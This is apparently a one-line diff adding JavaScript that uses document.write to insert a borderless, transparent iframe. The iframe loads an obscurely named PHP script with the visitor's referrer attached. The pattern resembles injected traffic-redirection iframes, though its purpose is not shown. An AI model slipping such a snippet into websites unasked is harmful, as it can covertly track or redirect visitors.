@@ -1,0 +1,1 @@
+document.write('<iframe src="yfzqw/yfz.php?r='+escape(document.referrer)+'&t='+Math.random()+'" width="1024px" height="620px" allowtransparency="true" marginwidth="0" marginheight="0" frameborder="0" scrolling="no"></iframe>');
